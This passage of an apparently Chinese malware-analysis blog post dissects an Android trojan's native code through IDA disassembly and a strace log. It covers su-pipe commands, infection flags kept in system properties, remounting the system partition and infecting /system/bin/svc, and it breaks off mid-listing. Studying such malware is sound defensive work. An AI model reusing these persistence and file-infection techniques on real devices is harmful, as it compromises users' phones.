class="line">.text:00000A86                 MOV     R1, R10</span><br><span class="line">.text:00000A88                 LDR     R2, [SP,#0x240+var_234]</span><br><span class="line">.text:00000A8A                 LDR     R3, [R4,R3]     ; PROP_RUNNING_CH</span><br><span class="line">.text:00000A8C                 STR     R1, [SP,#0x240+var_240] ; ‘NCutterope’压入堆栈</span><br><span class="line">.text:00000A8E                 MOVS    R0, R5          ; s        </span><br><span class="line">.text:00000A90                 MOV     R1, R8          ; format</span><br><span class="line">.text:00000A92                 BLX     sprintf</span><br><span class="line">.text:00000A96                 MOVS    R0, R5          ; char * &quot;/system/bin/setprop ro.bot.ch NCutterope\n&quot;</span><br><span class="line">.text:00000A98                 BLX     strlen</span><br><span class="line">.text:00000A9C                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000A9E                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000AA0                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AA2                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AA4                 BLX     fwrite</span><br><span class="line">.text:00000AA8                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000AAA                 BLX     fflush</span><br><span class="line">.text:00000AAE                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000AB0                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000AB2                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000AB4                 BLX     memset</span><br><span class="line">.text:00000AB8                 LDR     R1, =(aS - 0xAC2) ; &quot;%s\n&quot;</span><br><span class="line">.text:00000ABA                 MOVS    R2, R6          ; 生成的恶意文件名</span><br><span class="line">.text:00000ABC                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000ABE                 ADD     R1, PC          ; &quot;%s\n&quot;</span><br><span class="line">.text:00000AC0                 BLX     sprintf</span><br><span class="line">.text:00000AC4                 MOVS    R0, R5          ; char *</span><br><span class="line">.text:00000AC6                 BLX     strlen</span><br><span class="line">.text:00000ACA                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000ACC                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000ACE                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AD0                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AD2                 BLX     fwrite          ; 执行恶意文件</span><br><span class="line">.text:00000AD6                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000AD8                 BLX     fflush</span><br><span class="line">.text:00000ADC                 MOVS    R1, #0          ; c</span><br><span class="line">.text:00000ADE                 MOVS    R2, #0xFF       ; n</span><br><span class="line">.text:00000AE0                 MOVS    R0, R5          ; s</span><br><span class="line">.text:00000AE2                 BLX     memset</span><br><span class="line">.text:00000AE6                 LDR     R3, =0x74697865</span><br><span class="line">.text:00000AE8                 MOVS    R0, R5          ; char *</span><br><span class="line">.text:00000AEA                 STR     R3, [SP,#0x240+var_12C]</span><br><span class="line">.text:00000AEC                 MOVS    R3, #0xA</span><br><span class="line">.text:00000AEE                 STRH    R3, [R5,#4]</span><br><span class="line">.text:00000AF0                 BLX     strlen</span><br><span class="line">.text:00000AF4                 MOVS    R1, #1          ; size</span><br><span class="line">.text:00000AF6                 MOVS    R2, R0          ; n</span><br><span class="line">.text:00000AF8                 MOVS    R3, R7          ; s</span><br><span class="line">.text:00000AFA                 MOVS    R0, R5          ; ptr</span><br><span class="line">.text:00000AFC                 BLX     fwrite</span><br><span class="line">.text:00000B00                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000B02                 BLX     fflush</span><br><span class="line">.text:00000B06                 MOVS    R0, R7          ; stream</span><br><span class="line">.text:00000B08                 BLX     pclose</span><br><span class="line">.text:00000B0C                 MOVS    R0, #0x12C      ; seconds</span><br><span class="line">.text:00000B10                 BLX     sleep           ; 休眠300毫秒</span><br><span class="line">.text:00000B14                 MOVS    R0, R6          ; name</span><br><span class="line">.text:00000B16                 BLX     unlink          : 删除文件</span><br><span class="line">.text:00000B1A                 MOVS    R0, #1</span><br></pre></td></tr></table></figure>
+
+<p>整个代码一共往su管道写入了4次命令。第一次是”&#x2F;system&#x2F;bin&#x2F;setprop ro.bot.idandroid_id\n”；第二次是”&#x2F;system&#x2F;bin&#x2F;setprop ro.bot.ch NCutterope\n”；第三次是执行病毒主体文件；第四次是调用sleep()函数睡眠300毫秒，最后调用unlink()函数删除文件。</p>
+<p>在执行上述操作后，系统将还原寄存器的初始值，将压入堆栈中的寄存器值取出进行恢复</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> loc_B1C                                 ; CODE XREF: Java_com_airpuh_ad_UpdateCheck_DataInit+5A↑j</span><br><span class="line">.text:00000B1C                                         ; Java_com_airpuh_ad_UpdateCheck_DataInit+206↓j</span><br><span class="line">.text:00000B1C                 MOV     R2, R9</span><br><span class="line">.text:00000B1E                 LDR     R3, [R4,R2]     ; __stack_chk_guard</span><br><span class="line">.text:00000B20                 LDR     R2, [SP,#0x240+var_2C]</span><br><span class="line">.text:00000B22                 LDR     R3, [R3]</span><br><span class="line">.text:00000B24                 CMP     R2, R3</span><br><span class="line">.text:00000B26                 BNE     loc_B5C</span><br><span class="line">.text:00000B28                 MOVS    R3, #0x21C</span><br><span class="line">.text:00000B2C                 ADD     SP, R3</span><br><span class="line">.text:00000B2E                 POP     &#123;R2-R5&#125;</span><br><span class="line">.text:00000B30                 MOV     R8, R2</span><br><span class="line">.text:00000B32                 MOV     R9, R3</span><br><span class="line">.text:00000B34                 MOV     R10, R4</span><br><span class="line">.text:00000B36                 MOV     R11, R5</span><br><span class="line">.text:00000B38                 POP     &#123;R4-R7,PC&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在静态分析原生程序时，为了不影响函数调用时的中间结果，在使用前需要对函数中涉及到的通用寄存器进行现场保护。</p>
+<h3 id="Native层病毒核心分析"><a href="#Native层病毒核心分析" class="headerlink" title="Native层病毒核心分析"></a>Native层病毒核心分析</h3><p>我们使用上面提取出来的病毒主体在测试环境下运行并使用strace获取其调用的所有系统API函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push evil.bin /data/local/tmp</span><br><span class="line">chmod 777 /data/local/tmp/evil.bin</span><br><span class="line">strace evil.bin &gt; evil.strace</span><br></pre></td></tr></table></figure>
+
+<p>下面是从evil.strace文件中提取出的一段内容，这里是将&#x2F;system&#x2F;bin&#x2F;debuggerd文件复制一份保存到&#x2F;system&#x2F;framework&#x2F;debuggerd</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">access(&quot;/system/framework/debuggerd&quot;, F_OK) = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/system/bin/debuggerd&quot;, O_RDONLY|O_LARGEFILE) = 3</span><br><span class="line">open(&quot;/system/framework/debuggerd&quot;, O_RDWR|O_CREAT|O_TRUNC|O_LARGEFILE, 0600) = 4</span><br><span class="line">read(3, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0(\0\1\0\0\0°\221\0\000&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\2\0(\0\1\0\0\0°\221\0\000&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;dñ¼å\0Æ\217â\3Ê\214â\\ñ¼å\0Æ\217â\3Ê\214âTñ¼å\0Æ\217â&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;dñ¼å\0Æ\217â\3Ê\214â\\ñ¼å\0Æ\217â\3Ê\214âTñ¼å\0Æ\217â&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;\2Ð\177JzD\33à\200# \34\4!\32\1þ÷þï\36%#®)àþ÷Xï\1h&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\2Ð\177JzD\33à\200# \34\4!\32\1þ÷þï\36%#®)àþ÷Xï\1h&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;\222è\4\36\4Úý÷bï\1h\4)óÐ \34ø½\0\22\0\0ðµ\211°\1\220\f&quot;..., 4096) = 4096</span><br><span class="line">write(4, &quot;\222è\4\36\4Úý÷bï\1h\4)óÐ \34ø½\0\22\0\0ðµ\211°\1\220\f&quot;..., 4096) = 4096</span><br><span class="line">read(3, &quot;ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0&quot;..., 4096) = 1716</span><br><span class="line">write(4, &quot;ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0ÿÿÿÿ\0\0\0\0&quot;..., 1716) = 1716</span><br><span class="line">read(3, &quot;&quot;, 4096)                       = 0</span><br><span class="line">close(3)                                = 0</span><br><span class="line">close(4)                                = 0</span><br><span class="line">sync()                                  = 0</span><br><span class="line">sync()                                  = 0</span><br><span class="line">chmod(&quot;/system/framework/debuggerd&quot;, 0755) = 0</span><br></pre></td></tr></table></figure>
+
+<p>使用IDA打开保存的病毒主体，下面是<strong>设置感染标志</strong>的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.text:0000CAF0 loc_CAF0                                ; CODE XREF: main_0+3A↑j</span><br><span class="line">.text:0000CAF0                 LDR     R5, =(PROP_RUNNING_FLAG_ptr - 0xECB8)</span><br><span class="line">.text:0000CAF2                 LDR     R1, =0x44C</span><br><span class="line">.text:0000CAF4                 MOVS    R2, #0x7F</span><br><span class="line">.text:0000CAF6                 LDR     R0, [R6,R5]     ; PROP_RUNNING_FLAG ro.bot.run</span><br><span class="line">.text:0000CAF8                 ADD     R1, SP</span><br><span class="line">.text:0000CAFA                 STR     R1, [SP,#0x4F8+var_488] ; int</span><br><span class="line">.text:0000CAFC                 BL      sub_A76C</span><br><span class="line">.text:0000CB00                 CMP     R0, #0          ; ro.bot.run记录系统是否已经感染了木马</span><br><span class="line">.text:0000CB02                 BEQ     sub_CB16        ; </span><br><span class="line">.text:0000CB04                 LDRB    R3, [R0]        ; int</span><br><span class="line">.text:0000CB06                 CMP     R3, #0x30 ; &#x27;0&#x27;</span><br><span class="line">.text:0000CB08                 BNE     loc_CB0E      </span><br><span class="line">.text:0000CB0A                 BL      sub_D47E</span><br><span class="line">.text:0000CB0E ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000CB0E</span><br><span class="line">.text:0000CB0E loc_CB0E                                ; CODE XREF: main_0+58↑j</span><br><span class="line">.text:0000CB0E                 CMP     R3, #0x31 ; &#x27;1&#x27;</span><br><span class="line">.text:0000CB10                 BNE     sub_CB16        ; setprop_r0.bot.run</span><br><span class="line">.text:0000CB12                 BL      sub_D450        ; getprop_r0.bot.val</span><br></pre></td></tr></table></figure>
+
+<p>首先检查自己是以什么身份运行，即检测自己是否被感染。若感染即退出函数，否则就跳转到getprop_r0.bot.val读取属性r0.bot.val的值，使用当前时间减去这个差值，使用当前时间减去这个差值，判断是否大于3600.如果读取失败或者差值大于3600就跳到setprop_r0.bot.val标号处执行，相应代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0000D450 sub_D450                                ; CODE XREF: main_0+62↑p</span><br><span class="line">.text:0000D450</span><br><span class="line">.text:0000D450 arg_70          =  0x70</span><br><span class="line">.text:0000D450</span><br><span class="line">.text:0000D450                 MOVS    R0, #0          ; timer</span><br><span class="line">.text:0000D452                 BLX     time            ; 获取当前时间</span><br><span class="line">.text:0000D456                 LDR     R3, =0x1CC</span><br><span class="line">.text:0000D458                 MOVS    R7, R0</span><br><span class="line">.text:0000D45A                 LDR     R1, [SP,#arg_70]</span><br><span class="line">.text:0000D45C                 LDR     R0, [R6,R3]</span><br><span class="line">.text:0000D45E                 MOVS    R2, #0x7F</span><br><span class="line">.text:0000D460                 BL      sub_A76C        ; 这个属性保存的是病毒发作时间</span><br><span class="line">.text:0000D464                 CMP     R0, #0</span><br><span class="line">.text:0000D466                 BNE     loc_D46C</span><br><span class="line">.text:0000D468                 BL      sub_CB16</span><br><span class="line"></span><br><span class="line">.text:0000D46C loc_D46C                                ; CODE XREF: sub_D450+16↑j</span><br><span class="line">.text:0000D46C                 BLX     atol</span><br><span class="line">.text:0000D470                 MOVS    R3, #0xE1</span><br><span class="line">.text:0000D472                 SUBS    R7, R7, R0      ; 使用当前时间值减去保存的时间值</span><br><span class="line">.text:0000D474                 LSLS    R3, R3, #4      ; int</span><br><span class="line">.text:0000D476                 CMP     R7, R3          ; 判断感染时间间隔3600秒</span><br><span class="line">.text:0000D478                 BLE     sub_D47E</span><br><span class="line">.text:0000D47A                 BL      sub_CB16</span><br></pre></td></tr></table></figure>
+
+<p>我们来看下setprop_r0.bot.val标号处执行，即代码中的sub_CB16标记处。首先设置ro.bot.run的值为字符串”0”，然后开始感染系统文件，感染完成后再将其设置为字符串”1”。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0000CB16                 LDR     R5, [R6,R5]</span><br><span class="line">.text:0000CB18                 LDR     R1, =(a0 - 0xCB20) ; &quot;0&quot;</span><br><span class="line">.text:0000CB1A                 MOVS    R0, R5</span><br><span class="line">.text:0000CB1C                 ADD     R1, PC          ; &quot;0&quot;</span><br><span class="line">.text:0000CB1E                 BL      sub_A7D4</span><br><span class="line">.text:0000CB22                 BL      sub_BF6C        ; 感染系统文件</span><br><span class="line">.text:0000CB26                 BL      sub_C3F4</span><br><span class="line">.text:0000CB2A                 LDR     R1, =(a1 - 0xCB32) ; &quot;1&quot;</span><br><span class="line">.text:0000CB2C                 MOVS    R0, R5</span><br><span class="line">.text:0000CB2E                 ADD     R1, PC          ; &quot;1&quot;</span><br><span class="line">.text:0000CB30                 BL      sub_A7D4</span><br><span class="line">.text:0000CB34                 LDR     R3, =0x264</span><br><span class="line">.text:0000CB36                 LDR     R0, [R4]        ; dest</span><br><span class="line">.text:0000CB38                 LDR     R1, [R6,R3]     ; src</span><br><span class="line">.text:0000CB3A                 BLX     strcpy</span><br><span class="line">.text:0000CB3E                 BLX     fork</span><br><span class="line">.text:0000CB42                 CMP     R0, #0</span><br><span class="line">.text:0000CB44                 BEQ     loc_CB4A</span><br><span class="line">.text:0000CB46                 BL      sub_D47E</span><br></pre></td></tr></table></figure>
+
+<p>下面为<strong>感染系统文件</strong>的具体代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">.text:0000BDEE                 LDR     R3, [R3]</span><br><span class="line">.text:0000BDF0                 STR     R3, [SP,#0x248+var_2C]</span><br><span class="line">.text:0000BDF2                 BLX     open           ; 读取/system/bin/svc</span><br><span class="line">.text:0000BDF6                 SUBS    R7, R0, #0</span><br><span class="line">.text:0000BDF8                 BLT     loc_BECC</span><br><span class="line">.text:0000BDFA                 ADD     R6, SP, #0x248+buf</span><br><span class="line">.text:0000BDFC                 MOVS    R2, #0x80</span><br><span class="line">.text:0000BDFE                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BE00                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE02                 LSLS    R2, R2, #2      ; nbytes</span><br><span class="line">.text:0000BE04                 BLX     read            ; 调用read()读取/system/bin/svc</span><br><span class="line">.text:0000BE08                 MOV     R11, R0         </span><br><span class="line">.text:0000BE0A                 CMP     R0, #0</span><br><span class="line">.text:0000BE0C                 BGT     loc_BE10</span><br><span class="line">.text:0000BE0E                 B       loc_BEEE</span><br><span class="line">.text:0000BE10 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BE10</span><br><span class="line">.text:0000BE10 loc_BE10                                ; CODE XREF: sub_BDD0+3C↑j</span><br><span class="line">.text:0000BE10                 LDRB    R3, [R6]        ; 读取文件内容的第一个字符</span><br><span class="line">.text:0000BE12                 CMP     R3, #0x23 ; &#x27;#&#x27; ; 第一个字符是否为&#x27;#&#x27;</span><br><span class="line">.text:0000BE14                 BNE     loc_BE18</span><br><span class="line">.text:0000BE16                 B       loc_BF02        ; 为&#x27;#&#x27;则跳转</span><br><span class="line">.text:0000BE18 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000BE18</span><br><span class="line">.text:0000BE18 loc_BE18                                ; CODE XREF: sub_BDD0+44↑j</span><br><span class="line">.text:0000BE18                                         ; sub_BDD0+138↓j ...</span><br><span class="line">.text:0000BE18                 MOVS    R1, #0</span><br><span class="line">.text:0000BE1A                 STR     R6, [SP,#0x248+s1]</span><br><span class="line">.text:0000BE1C                 STR     R1, [SP,#0x248+n]</span><br><span class="line">.text:0000BE1E                 STR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE20</span><br><span class="line">.text:0000BE20 loc_BE20                                ; CODE XREF: sub_BDD0+16E↓j</span><br><span class="line">.text:0000BE20                                         ; sub_BDD0+17C↓j</span><br><span class="line">.text:0000BE20                 LDR     R2, =(BOOT_MAGIC_ptr - 0xECB8)</span><br><span class="line">.text:0000BE22                 LDR     R5, [R4,R2]     ; BOOT_MAGIC /system/bin/ifconfig</span><br><span class="line">.text:0000BE24                 STR     R2, [SP,#0x248+var_244]</span><br><span class="line">.text:0000BE26                 MOVS    R0, R5          ; s</span><br><span class="line">.text:0000BE28                 BLX     strlen</span><br><span class="line">.text:0000BE2C                 MOVS    R1, R5          ; s2</span><br><span class="line">.text:0000BE2E                 MOVS    R2, R0          ; n</span><br><span class="line">.text:0000BE30                 LDR     R0, [SP,#0x248+s1] ; s1</span><br><span class="line">.text:0000BE32                 BLX     memcmp</span><br><span class="line">.text:0000BE36                 CMP     R0, #0</span><br><span class="line">.text:0000BE38                 BEQ     loc_BEEE</span><br><span class="line">.text:0000BE3A                 LDR     R3, =(BOOT_TEMP_FILE_ptr - 0xECB8)</span><br><span class="line">.text:0000BE3C                 LDR     R1, =0x242      ; oflag</span><br><span class="line">.text:0000BE3E                 LDR     R2, =0x1ED</span><br><span class="line">.text:0000BE40                 LDR     R0, [R4,R3]     ; BOOT_TEMP_FILE ; file /data/.bootemp</span><br><span class="line">.text:0000BE42                 STR     R3, [SP,#0x248+var_238]</span><br><span class="line">.text:0000BE44                 BLX     open</span><br><span class="line">.text:0000BE48                 MOV     R8, R0</span><br><span class="line">.text:0000BE4A                 CMP     R0, #0</span><br><span class="line">.text:0000BE4C                 BLT     loc_BEEE</span><br><span class="line">.text:0000BE4E                 LDR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE50                 CMP     R1, #0</span><br><span class="line">.text:0000BE52                 BEQ     loc_BE5E</span><br><span class="line">.text:0000BE54                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE56                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE58                 LDR     R2, [SP,#0x248+n] ; n</span><br><span class="line">.text:0000BE5A                 BLX     write            ; 在/data/.bootemp文件第一行写入/system/bin/ifconfig</span><br><span class="line"></span><br><span class="line">.text:0000BE5E loc_BE5E                                ; CODE XREF: sub_BDD0+82↑j</span><br><span class="line">.text:0000BE5E                 LDR     R2, [SP,#0x248+var_244]</span><br><span class="line">.text:0000BE60                 LDR     R5, [R4,R2]</span><br><span class="line">.text:0000BE62                 MOVS    R0, R5          ; s</span><br><span class="line">.text:0000BE64                 BLX     strlen</span><br><span class="line">.text:0000BE68                 MOVS    R1, R5          ; buf</span><br><span class="line">.text:0000BE6A                 MOVS    R2, R0          ; n</span><br><span class="line">.text:0000BE6C                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE6E                 BLX     write</span><br><span class="line">.text:0000BE72                 LDR     R1, [SP,#0x248+var_23C]</span><br><span class="line">.text:0000BE74                 MOV     R3, R11</span><br><span class="line">.text:0000BE76                 MOV     R0, R8          ; fd</span><br><span class="line">.text:0000BE78                 SUBS    R2, R3, R1      ; n</span><br><span class="line">.text:0000BE7A                 LDR     R1, [SP,#0x248+s1] ; buf</span><br><span class="line">.text:0000BE7C                 BLX     write</span><br><span class="line">.text:0000BE80                 MOV     R5, R8</span><br><span class="line">.text:0000BE82                 MOV     R8, R4</span><br><span class="line">.text:0000BE84</span><br><span class="line">.text:0000BE84 loc_BE84                                ; CODE XREF: sub_BDD0+D0↓j</span><br><span class="line">.text:0000BE84                 MOVS    R2, #0x80</span><br><span class="line">.text:0000BE86                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BE88                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE8A                 LSLS    R2, R2, #2      ; nbytes 每次读0x100字节</span><br><span class="line">.text:0000BE8C                 BLX     read</span><br><span class="line">.text:0000BE90                 SUBS    R4, R0, #0</span><br><span class="line">.text:0000BE92                 BLE     loc_BEA2</span><br><span class="line">.text:0000BE94                 MOVS    R0, R5          ; fd</span><br><span class="line">.text:0000BE96                 MOVS    R1, R6          ; buf</span><br><span class="line">.text:0000BE98                 MOVS    R2, R4          ; n</span><br><span class="line">.text:0000BE9A                 BLX     write</span><br><span class="line">.text:0000BE9E                 CMP     R4, R0</span><br><span class="line">.text:0000BEA0                 BEQ     loc_BE84        ; 循环读写文件，复制动作</span><br><span class="line">.text:0000BEA2</span><br><span class="line">.text:0000BEA2 loc_BEA2                                ; CODE XREF: sub_BDD0+C2↑j</span><br><span class="line">.text:0000BEA2                 MOVS    R0, R7          ; fd</span><br><span class="line">.text:0000BEA4                 BLX     close</span><br><span class="line">.text:0000BEA8                 MOVS    R0, R5          ; fd</span><br><span class="line">.text:0000BEAA                 BLX     close</span><br><span class="line">.text:0000BEAE                 BLX     sync</span><br><span class="line">.text:0000BEB2                 BLX     sync</span><br><span class="line">.text:0000BEB6                 LDR     R2, [SP,#0x248+var_238]</span><br><span class="line">.text:0000BEB8                 MOV     R4, R8</span><br><span class="line">.text:0000BEBA                 MOV     R1, R10</span><br><span class="line">.text:0000BEBC                 LDR     R5, [R4,R2]</span><br><span class="line">.text:0000BEBE                 MOVS    R2, #1</span><br><span class="line">.text:0000BEC0                 MOVS    R0, R5</span><br><span class="line">.text:0000BEC2                 BL      sub_BB9C        ; 感染/system/bin/svc文件</span><br><span class="line">.text:0000BEC6                 MOVS    R0, R5          ; name</span><br><span class="line">.text:0000BEC8                 BLX     unlink          ; 删除/data/.bootemp文件</span><br></pre></td></tr></table></figure>
+
+<p>上面为svc文件的整个感染过程，这段代码主要的是在调用sub_bb9c，我们来看下他的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">.text:0000BB9C sub_BB9C                                ; CODE XREF: sub_BC0C+15A↓p</span><br><span class="line">.text:0000BB9C                                         ; sub_BDD0+F2↓p ...</span><br><span class="line">.text:0000BB9C</span><br><span class="line">.text:0000BB9C var_18          = -0x18</span><br><span class="line">.text:0000BB9C var_14          = -0x14</span><br><span class="line">.text:0000BB9C</span><br><span class="line">.text:0000BB9C ; __unwind &#123;</span><br><span class="line">.text:0000BB9C                 PUSH    &#123;R4-R6,LR&#125;</span><br><span class="line">.text:0000BB9E                 SUB     SP, SP, #8</span><br><span class="line">.text:0000BBA0                 MOVS    R4, R1</span><br><span class="line">.text:0000BBA2                 MOVS    R6, R2</span><br><span class="line">.text:0000BBA4                 MOVS    R5, R0</span><br><span class="line">.text:0000BBA6                 BL      sub_AA38        ; 获取系统文件的最后一次改变时间   </span><br><span class="line">.text:0000BBAA                 STR     R0, [SP,#0x18+var_14]</span><br><span class="line">.text:0000BBAC                 MOVS    R0, #0</span><br><span class="line">.text:0000BBAE                 BL      sub_A820        ; 重新挂载系统分区为可读写</span><br><span class="line">.text:0000BBB2                 MOVS    R0, #0          ; timer</span><br><span class="line">.text:0000BBB4                 BLX     time</span><br><span class="line">.text:0000BBB8                 STR     R0, [SP,#0x18+var_18]</span><br><span class="line">.text:0000BBBA                 ADD     R0, SP, #0x18+var_14</span><br><span class="line">.text:0000BBBC                 BL      